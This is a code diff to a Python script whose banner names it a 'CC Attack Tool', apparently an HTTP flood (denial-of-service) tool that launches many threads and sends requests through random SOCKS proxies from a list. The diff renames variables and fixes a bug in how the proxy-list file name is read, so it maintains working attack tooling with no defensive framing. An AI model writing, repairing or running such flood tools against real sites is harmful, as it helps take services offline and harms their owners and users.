@@ -29,10 +29,10 @@ print("  CC Attack Tool Using Requests Module")
 print("      Code By GogoZin. -2019/8/2")
 
 def opth():
-	for i in range(thr):
+	for g in range(thr):
 		x = threading.Thread(target=atk)
 		x.start()
-		print("Threads " + str(i+1)+ " Created ")
+		print("Threads " + str(g+1)+ " Created ")
 		time.sleep(0.01)
 	print("Wait A Few Seconds For Threads Ready To Attack . . .")
 	global tt
@@ -40,7 +40,7 @@ def opth():
 	
 def main():
 	global pprr
-	global litt
+	global lts
 	global proxy
 	global url
 	global pwr
@@ -55,16 +55,16 @@ def main():
 			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
 	else:
 		pass
-	litt = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
-	if list == "":
-		list = 'socks.txt'
+	lts = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
+	if lts == "":
+		lts = 'socks.txt'
 	else:
-		list = str(list)
+		lts = str(lts)
 	pwr = int(input(Fore.BLUE + "CC.Power (1-100 Default Is 70) : " + Fore.WHITE))
 	opth()
 
 def atk():
-	pprr = open(litt).readlines()
+	pprr = open(lts).readlines()
 	proxy = random.choice(pprr).strip().split(":")
 	s = requests.session()
 	s.proxies = {}
